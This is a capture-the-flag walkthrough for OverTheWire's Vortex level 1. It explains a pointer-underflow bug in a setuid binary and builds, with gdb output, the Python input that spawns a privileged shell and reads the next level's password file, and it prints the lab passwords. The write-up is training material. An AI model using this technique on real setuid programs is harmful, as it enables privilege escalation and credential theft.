## Vortex Level 1 → Level 2
### Canary Values

Problem page: <http://overthewire.org/wargames/vortex/vortex1.html>

#### Preamble

Okay, vortex level 1, time to start writing exploits, but first, let's go over how these vortex problems work, let's ssh into the lab as vortex1 with the password we got in level 0.  
The `sshpass` program is useful for logging into the vortex machines without having to type the password each time.

```console
sshpass -p Gq#qu3bF3 ssh vortex1@vortex.labs.overthewire.org -p 2228
```

The goal of each vortex level is to get the password for the next level, these passwords can be found in `/etc/vortex_pass/` Let's try to get the password for the vortex2 user.

```console
vortex1@vortex:~$ cat /etc/vortex_pass/vortex2
cat: /etc/vortex_pass/vortex2: Permission denied
vortex1@vortex:~$ ls -l /etc/vortex_pass/vortex2
-r-------- 1 vortex2 vortex2 10 Aug 20 04:24 /etc/vortex_pass/vortex2
```

I didn't expect that to work, but it was worth a shot.  
We see that the owner of the password file is vortex2, so we'll need to convince the lab that we're that user in order to access that file.

The exploitable executables for each problem are located in `/vortex/`, let's look at `/vortex/vortex1`

```console
vortex1@vortex:~$ ls -l /vortex/vortex1
-r-sr-x--- 1 vortex2 vortex1 7607 Aug 20 04:24 /vortex/vortex1
```

What's important to notice here is that the [setuid bit](https://en.wikipedia.org/wiki/Setuid#When_set_on_an_executable_file) of the excecutable is set to `vortex2`, meaning that the file will run as vortex2, this is the case for all the vortex excecutables and will obviously be very useful for us in accessing those password files

Anyways, let's look at the actual code we're going to exploit

#### Finding the exploit

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }

void print(unsigned char *buf, int len)
{
  int i;

  printf("[ ");
  for(i=0; i < len; i++) printf("%x ", buf[i]);
  printf(" ]\n");
}

int main()
{
  unsigned char buf[512];
  unsigned char *ptr = buf + (sizeof(buf)/2);
  unsigned int x;

  while((x = getchar()) != EOF) {
    switch(x) {
    case '\n': print(buf, sizeof(buf)); continue; break;
    case '\\': ptr--; break; 
    default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
    }
  }
  printf("All done\n");
}
```

Okay, so the goal jumps out at you at the very start of this program

```C
#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }
```

When `e()` is called, if the [most significant byte](https://en.wikipedia.org/wiki/Bit_numbering#Most_significant_byte) of `ptr` is equal to `0xca`, the program will set the real user ID to the effective user ID (i.e. vortex2), and then spawn a shell.  From that shell we would be able to read the contents of the password file.  
So our goal is to have the program call `e()` after we mess with the value of `ptr`, let's look at the program as a whole.

We have two main variables we're dealing with here:  
  * `buf`, a 512-length char array.
  * `ptr`, a char pointer which points to the 256th byte of `buf`

The rest of the program is a while loop that reads input into the `x` variable until `EOF` is received. For each character of input the program does one of 3 things:
  * If a newline is inputted, `buf` is printed
  * If a backslash is inputted, `ptr` is decremented, making it point one byte earlier in memory.
  * otherwise, `e()` is called, the value of whatever `ptr` is pointing at is set equal to `x`, then `ptr` is incremented

The way we can exploit this program is in the second case of this switch, `ptr` can be decremented past the start of `buf` and into other memory.  
Remember that our goal is to set the most significant byte of `ptr` to `0xca`. Since memory grows towards lower addresses in the vortex machine's architecture, `ptr` will be located directly `buf` in memory, so if we input enough backslashes, we will be able to have `ptr` point at its own address. We can then input the byte `0xca` into the program to alter `ptr` and be able to pass the conditional in `e()`.

#### Writing the Exploit

Okay so let's start writing the string we'll throw it the program to make it give us a shell. We'll use Python instead of C since strings are just a *teensy* bit easier.

Let's start with the 256 backslashes to get from `ptr`'s initial location to the start of `buf`

```python
print("\\" * 256)
```

Now we need to send some more backslashes to get to the byte we need, however this is a bit more complicated than it might seem. Memory is [alligned](https://en.wikipedia.org/wiki/Data_structure_alignment) differently in different architectures, so `ptr` might not be exactly 4 bytes before `buf`, we might be able to look up processor specifications and do some math to figure out exactly where the byte we need to alter is, but it'll probably be easier to use gdb to look at the disassembly of the program and see where an the stack our local variables are being stored.

```console
vortex1@vortex:~$ gdb /vortex/vortex1
(gdb) disassemble main
Dump of assembler code for function main:
0x080485c0 <+0>:     push   %ebp
0x080485c1 <+1>:     mov    %esp,%ebp
0x080485c3 <+3>:     push   %esi
0x080485c4 <+4>:     push   %ebx
0x080485c5 <+5>:     and    $0xfffffff0,%esp
0x080485c8 <+8>:     sub    $0x220,%esp
0x080485ce <+14>:    mov    %gs:0x14,%eax
0x080485d4 <+20>:    mov    %eax,0x21c(%esp)
0x080485db <+27>:    xor    %eax,%eax
0x080485dd <+29>:    lea    0x1c(%esp),%eax
0x080485e1 <+33>:    add    $0x100,%eax
0x080485e6 <+38>:    mov    %eax,0x14(%esp)
...
End of assembler dump.
(gdb) quit
```

The disassembly is pretty big, so I cut out everything after the info we need. We see that the start of `buf` is at `0x1c` on the stack, and that `ptr` is at `0x14`. Since the vortex machines are on a [little endian](https://en.wikipedia.org/wiki/Endianness#Little-endian) architecture, the most significant bit of `ptr` will be located at the end of the word, so at `0x17` in this case. `0x1c - 0x17 = 0x5` so the byte we need to point at is 5 bytes before the start of `buf`.  
Let's add those 5 more backslashes.

```python
print("\\" * 261)
```

So now we're pointing at the byte we need to change, so let's add the `0xca` byte to our string to set it in order to be able to pass the `e()` conditional.  
Remember that the default case of the program's switch statement also increments `ptr`, so we'll decrement it with another backslash in the incredibly unlikely case that `ptr` was equal to `0xcaffffff` and would have been incremented to `0xcd000000`
We finish off our exploit string with any character that's not `\n` or `\\`, this will call `e()` again and create the shell we need.

```python
print("\\" * 261 + chr(0xca) + "\\" + ".")
```

That'll have the shell spawned, let's add on a `whoami` and the `cat /etc/vortex_pass/vortex2` to the end of our exploit

```python
print("\\" * 261 + chr(0xca) + "\\" + "." + "\nwhoami\ncat /etc/vortex_pass/vortex2\n")
```

Alright, this should do it, let's run it!

```console
vortex1@vortex:~$ python -c 'print("\\" * 261 + "\xca" + "\\" + "." + "\nwhoami\n\cat /etc/vortex_pass/vortex2\n")' | /vortex/vortex1
vortex1@vortex:~$
```

Okay so nothing happened, which is sub-optimal obviously, but not all that bad.  
Normally before `/vortex/vortex1` exits, it prints out `"All done"`, but that didn't happen this time, so we know that we likely managed to successfully spawn the shell. What happened then, why didn't it run the `whoami` or `cat` commands?

#### Fixing the Exploit

Basically on the back end of Linux's syscalls, when a program calls `read()`, it tries to read `4096` bytes at a time, you can read more about the way this Linux does these buffers in [this article](http://www.pixelbeat.org/programming/stdio_buffering/).  
Anyways, the result of this behaviour is that there will be no input for the spawned shell to read, as the reads from `vortex2` will have consumed all the data. The shell will then immediately try to read, but only get an `EOF`, which the newly spawned shell interprets as an exit command.

A way we can get around this issue is by writing enough data after the `"."` to make our input be of length `4096` before the commands we want the shell to run.  
The length of our string before the commands is `264`, `4096 - 264 = 3832`, so our final string is:

```python
print("\\"*261 + chr(0xca) + "\\" + "." + "."*3832 + "\nwhoami\ncat /etc/vortex_pass/vortex2\n")
```

Running it:

```console
vortex1@vortex:~$ python -c 'print("\\"*261 + chr(0xca) + "\\" + "." + "."*3832 + "\nwhoami\ncat /etc/vortex_pass/vortex2\n")' | /vortex/vortex1
vortex2
23anbT\rE
vortex1@vortex:~$
```

There we go, level 1 solved! Thankfully level 2 will be a lot less long-winded than this one was.